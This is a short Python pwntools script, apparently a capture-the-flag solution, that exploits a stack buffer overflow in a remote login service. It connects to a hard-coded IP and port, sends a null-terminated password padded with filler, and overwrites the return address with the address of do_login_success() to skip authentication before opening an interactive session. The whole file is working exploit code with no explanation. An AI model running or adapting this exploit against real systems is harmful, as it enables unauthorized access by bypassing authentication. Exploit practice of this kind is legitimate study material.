from pwn import *


io = remote('45.76.91.112', 10052)
io.recvuntil(b"Enter password:")


junk_length = 32 + 8
desired_pass_length = 8
trick_password = 'a' * desired_pass_length + '\x00' # scanf doesn't stop at '\0' (because it's not considered whitespace)
junk = bytes(trick_password + 'a' * (junk_length - len(trick_password)), 'utf-8')

new_ret_value = p64(0x0004011c6) # Address of do_login_success()
input = junk + new_ret_value
io.sendline(input)


io.interactive()
